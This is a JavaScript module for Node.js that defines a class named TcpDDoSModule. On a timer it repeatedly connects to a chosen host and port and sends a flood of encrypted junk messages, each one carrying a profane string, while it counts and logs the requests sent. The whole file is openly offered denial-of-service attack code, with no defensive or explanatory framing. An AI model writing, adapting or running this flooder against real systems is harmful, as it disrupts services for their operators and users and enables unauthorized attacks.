const { Socket } = require("net");
const CryptoJS = require("crypto-js");

class TcpDDoSModule {
  #host = "";
  #port = 0;
  #requestCount = 0;

  constructor(host, port, ms, rpm) {
    this.client = new Socket();
    this.ms = ms;
    this.#host = host;
    this.#port = port;
    this.rpm = rpm;
  }

  async init() {
    setInterval(this._makeRequest.bind(this), this.ms);
  }

  _makeRequest() {
    const connection = { host: this.#host, port: this.#port };

    this.client.connect(connection, this._tcpConnect.bind(this));
    this.client.on("error", this._tcpError.bind(this));
  }

  async _tcpConnect() {
    console.log("[Info]: TCP connection is ready");

    const message = CryptoJS.AES.encrypt("Fuck you asshole", (new Date()).valueOf().toString()).toString();

    for(let i = 0; i <= this.rpm; i++) {
      await this.client.write(message);
      this.#requestCount++;
    }

    this._destroyClient();

    console.log(`[Request]: Host: ${this.#host}, Port: ${this.#port}, Requests: ${this.#requestCount}`);
  }

  _tcpError(err) {
    console.log("[Error]:", err.message);
    this._destroyClient();
  }

  _destroyClient() {
    this.client.destroy();
    this.client = new Socket();
  }
}

module.exports = TcpDDoSModule;
